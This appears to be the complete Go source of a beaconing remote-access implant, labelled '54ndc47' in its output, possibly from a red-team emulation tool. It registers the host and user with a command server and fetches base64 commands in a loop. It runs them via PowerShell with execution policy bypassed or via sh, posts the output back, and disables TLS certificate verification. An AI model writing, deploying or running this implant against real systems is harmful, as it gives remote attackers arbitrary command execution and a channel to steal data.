package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"io/ioutil"
	"time"
	"os/exec"
	"encoding/base64"
	"encoding/json"
	"reflect"
)

func encode(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func decode(s string) []byte {
    raw, _ := base64.StdEncoding.DecodeString(s)
	return raw
}

func unpack(b []byte) (out map[string]interface{}) {
	_ = json.Unmarshal(b, &out)
	return
}

func makeRequest(address string, paw string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(encode(data)))
	req.Header.Set("X-PAW", paw)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return decode(string(body))
}

func execute(command string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
	} 
	return exec.Command("sh", "-c", command).Output()
}

func register(server string, paw string, host string, group string) map[string]interface{} {
	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "host": host, "group": group})
	address := fmt.Sprintf("%s/sand/register", server)
	return unpack(makeRequest(address, paw, data))
}

func getInstructions(server string, paw string) interface{} {
	address := fmt.Sprintf("%s/sand/instructions", server)
	bites := makeRequest(address, paw, nil)
	var out interface{}
	json.Unmarshal(bites, &out)
	return out
}

func postResults(server string, paw string, command map[string]interface{}) {
	fmt.Println("[54ndc47] running task")
	cmd := string(decode(command["command"].(string)))
	status := "0"
	result, err := execute(cmd)
	if err != nil {
		status = "1"
	}
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", command["id"].(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(encode(result)), "status": status})
	makeRequest(address, paw, data)
	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s%s", host, user.Username)
	server := os.Args[1]
	group := os.Args[2]

	registration := register(server, paw, host, group)
	if registration["status"] == true {
		fmt.Println("[54ndc47] registered")
		for {
			fmt.Println("[54ndc47] beacon")
			commands := getInstructions(os.Args[1], paw)
			if len(commands.([]interface{})) > 0 {
				cmds := reflect.ValueOf(commands)
				for i := 0; i < cmds.Len(); i++ {
					command := cmds.Index(i).Elem().String()
					postResults(os.Args[1], paw, unpack([]byte(command)))
				}
			} else {
				time.Sleep(time.Duration(registration["sleep"].(float64)) * time.Second)
			}
		}
	}
}
